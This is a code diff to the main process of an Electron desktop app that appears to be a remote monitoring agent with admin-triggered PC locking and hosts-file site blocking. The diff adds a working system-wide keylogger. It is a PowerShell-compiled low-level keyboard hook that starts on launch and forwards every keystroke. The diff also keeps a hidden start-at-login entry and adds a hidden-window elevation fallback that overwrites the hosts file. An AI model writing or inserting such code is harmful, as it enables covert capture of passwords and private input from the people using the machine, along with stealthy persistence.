@@ -211,7 +211,156 @@ function createWindow() {
     });
 }
 
+function mapVkCodeToChar(vkCode, shift, caps) {
+    if (vkCode >= 65 && vkCode <= 90) {
+        const isUpper = shift !== caps;
+        const baseChar = String.fromCharCode(vkCode);
+        return isUpper ? baseChar : baseChar.toLowerCase();
+    }
+    if (vkCode >= 48 && vkCode <= 57) {
+        const num = String.fromCharCode(vkCode);
+        if (shift) {
+            const shiftMap = {
+                '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
+                '6': '^', '7': '&', '8': '*', '9': '(', '0': ')'
+            };
+            return shiftMap[num] || num;
+        }
+        return num;
+    }
+    if (vkCode >= 96 && vkCode <= 105) {
+        return (vkCode - 96).toString();
+    }
+    switch (vkCode) {
+        case 32: return 'Space';
+        case 13: return 'Enter';
+        case 8: return 'BackSpace';
+        case 9: return 'Tab';
+        case 27: return 'Escape';
+        case 46: return 'Delete';
+        case 35: return 'End';
+        case 36: return 'Home';
+        case 37: return 'Left';
+        case 38: return 'Up';
+        case 39: return 'Right';
+        case 40: return 'Down';
+        case 186: return shift ? ':' : ';';
+        case 187: return shift ? '+' : '=';
+        case 188: return shift ? '<' : ',';
+        case 189: return shift ? '_' : '-';
+        case 190: return shift ? '>' : '.';
+        case 191: return shift ? '?' : '/';
+        case 192: return shift ? '~' : '`';
+        case 219: return shift ? '{' : '[';
+        case 220: return shift ? '|' : '\\';
+        case 221: return shift ? '}' : ']';
+        case 222: return shift ? '"' : "'";
+        case 106: return '*';
+        case 107: return '+';
+        case 109: return '-';
+        case 110: return '.';
+        case 111: return '/';
+    }
+    return null;
+}
+
+function startKeylogger() {
+    const { spawn } = require('child_process');
+    const psScript = `
+        $code = @'
+        using System;
+        using System.Diagnostics;
+        using System.Runtime.InteropServices;
+        using System.Windows.Forms;
+
+        public class Keylogger {
+            private const int WH_KEYBOARD_LL = 13;
+            private const int WM_KEYDOWN = 0x0100;
+            private const int WM_SYSKEYDOWN = 0x0104;
+            private static HookProc _proc = HookCallback;
+            private static IntPtr _hookID = IntPtr.Zero;
+
+            public static void Start() {
+                _hookID = SetHook(_proc);
+                Application.Run();
+            }
+
+            private static IntPtr SetHook(HookProc proc) {
+                using (Process curProcess = Process.GetCurrentProcess())
+                using (ProcessModule curModule = curProcess.MainModule) {
+                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+                }
+            }
+
+            private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+                if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
+                    int vkCode = Marshal.ReadInt32(lParam);
+                    bool shift = (GetKeyState(0x10) & 0x8000) != 0;
+                    bool caps = (GetKeyState(0x14) & 0x0001) != 0;
+                    Console.WriteLine(vkCode + "," + (shift ? "1" : "0") + "," + (caps ? "1" : "0"));
+                }
+                return CallNextHookEx(_hookID, nCode, wParam, lParam);
+            }
+
+            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+            [DllImport("user32.dll")]
+            private static extern short GetKeyState(int nVirtKey);
+        }
+        '@
+
+        Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms
+        [Keylogger]::Start()
+    `;
+
+    try {
+        const keyloggerProcess = spawn('powershell.exe', ['-NoProfile', '-Command', psScript]);
+        
+        keyloggerProcess.stdout.on('data', (data) => {
+            const lines = data.toString().split('\\n');
+            for (let line of lines) {
+                line = line.trim();
+                if (!line) continue;
+                const parts = line.split(',');
+                if (parts.length === 3) {
+                    const vkCode = parseInt(parts[0]);
+                    const shift = parts[1] === '1';
+                    const caps = parts[2] === '1';
+                    const key = mapVkCodeToChar(vkCode, shift, caps);
+                    if (key && mainWindow && !mainWindow.isDestroyed()) {
+                        mainWindow.webContents.send('keylog-data', { key });
+                    }
+                }
+            }
+        });
+
+        keyloggerProcess.stderr.on('data', (data) => {
+            console.error('Keylogger Process Error:', data.toString());
+        });
+
+        app.on('will-quit', () => {
+            keyloggerProcess.kill();
+        });
+    } catch (e) {
+        console.error('Failed to start keylogger process:', e);
+    }
+}
+
 app.whenReady().then(async () => {
+    startKeylogger();
     // Auto-grant camera/microphone media permissions for Electron window
     const { session } = require('electron');
 
@@ -233,15 +382,18 @@ app.whenReady().then(async () => {
         return allowedPermissions.includes(permission);
     });
 
-    // Make sure it starts on boot
-    app.setLoginItemSettings({
-        openAtLogin: true,
-        path: app.getPath('exe'),
-        args: [
-            '--processStart', `"${path.basename(app.getPath('exe'))}"`,
-            '--process-args', `"--hidden"`
-        ]
-    });
+    // Make sure it starts on boot (only in packaged production mode)
+    if (app.isPackaged) {
+        const exePath = process.env.PORTABLE_EXECUTABLE_FILE || app.getPath('exe');
+        app.setLoginItemSettings({
+            openAtLogin: true,
+            path: exePath,
+            args: [
+                '--processStart', `"${path.basename(exePath)}"`,
+                '--process-args', `"--hidden"`
+            ]
+        });
+    }
 
     // In modern Electron, desktopCapturer must be called from main process
     // Returns ALL monitors for multi-monitor support
@@ -259,8 +411,16 @@ app.whenReady().then(async () => {
         console.log('🔒 Admin commanded: Lock PC');
         const { exec } = require('child_process');
         exec('rundll32.exe user32.dll,LockWorkStation', (err) => {
-            if (err) console.error('Lock error:', err.message);
-            else console.log('✅ PC Locked successfully');
+            if (err) {
+                console.warn('rundll32 lock failed, trying powershell:', err.message);
+                const psLockCmd = `powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class L { [DllImport(\\"user32.dll\\")] public static extern bool LockWorkStation(); }'; [L]::LockWorkStation()"`;
+                exec(psLockCmd, (psErr) => {
+                    if (psErr) console.error('PowerShell lock error:', psErr.message);
+                    else console.log('✅ PC Locked successfully via PowerShell');
+                });
+            } else {
+                console.log('✅ PC Locked successfully via rundll32');
+            }
         });
     });
 
@@ -292,13 +452,37 @@ app.whenReady().then(async () => {
                 hostsContent += `\n# SENTINEL_START\n${blockLines}\n# SENTINEL_END\n`;
             }
             
-            // Write hosts file requires admin — use PowerShell elevated
-            const tempPath = path.join(os.tmpdir(), 'sentinel_hosts.txt');
-            fs.writeFileSync(tempPath, hostsContent, 'utf8');
-            exec(`powershell -Command "Copy-Item '${tempPath}' '${hostsPath}' -Force"`, (err) => {
-                if (err) console.error('Hosts update error:', err.message);
-                else console.log('✅ Hosts file updated, websites blocked');
-            });
+            // Try direct write first (succeeds if running as Admin)
+            try {
+                fs.writeFileSync(hostsPath, hostsContent, 'utf8');
+                console.log('✅ Hosts file updated directly, websites blocked');
+                // Flush DNS cache
+                exec('ipconfig /flushdns', (dnsErr) => {
+                    if (dnsErr) console.error('DNS flush error:', dnsErr.message);
+                    else console.log('✅ DNS cache flushed successfully');
+                });
+            } catch (directErr) {
+                console.warn('Direct write to hosts failed, trying elevated PowerShell:', directErr.message);
+                const tempPath = path.join(os.tmpdir(), 'sentinel_hosts.txt');
+                fs.writeFileSync(tempPath, hostsContent, 'utf8');
+                
+                // Use Start-Process with Verb RunAs to elevate and copy
+                const psCommand = `Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command Copy-Item -Path ''${tempPath}'' -Destination ''${hostsPath}'' -Force' -Verb RunAs`;
+                exec(`powershell -NoProfile -Command "${psCommand}"`, (err) => {
+                    if (err) {
+                        console.error('Elevated hosts copy error:', err.message);
+                    } else {
+                        console.log('✅ Elevated hosts copy request sent');
+                        // Flush DNS cache
+                        setTimeout(() => {
+                            exec('ipconfig /flushdns', (dnsErr) => {
+                                if (dnsErr) console.error('DNS flush error:', dnsErr.message);
+                                else console.log('✅ DNS cache flushed successfully');
+                            });
+                        }, 2000); // Wait 2s for elevation to complete before flushing
+                    }
+                });
+            }
         } catch (err) {
             console.error('❌ Failed to modify hosts file:', err.message);
         }
